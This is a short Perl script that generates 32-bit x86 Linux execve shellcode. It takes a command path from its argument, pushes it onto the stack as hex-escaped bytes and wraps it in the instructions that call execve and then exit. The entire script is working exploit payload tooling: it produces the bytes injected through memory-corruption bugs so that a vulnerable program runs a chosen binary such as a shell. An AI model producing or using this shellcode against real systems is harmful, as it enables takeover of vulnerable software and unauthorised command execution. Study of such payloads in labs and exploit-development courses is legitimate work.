#!/usr/bin/env perl
use strict;
use warnings;

my $string = '/'x (4 - length($ARGV[0]) % 4) . $ARGV[0] ;
# print "$string\n";

print '\x31\xc0\x50';

my $l = length($string);
my $p = '';
while (my $c = chop $string)
{
	if (length$p == 16)
	{
		print '\x68',($p);
		$p = '';
	}
	$p = sprintf("\\x%x", ord($c)) . $p;
}
print '\x68',($p);

print '\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80';
print "\n"
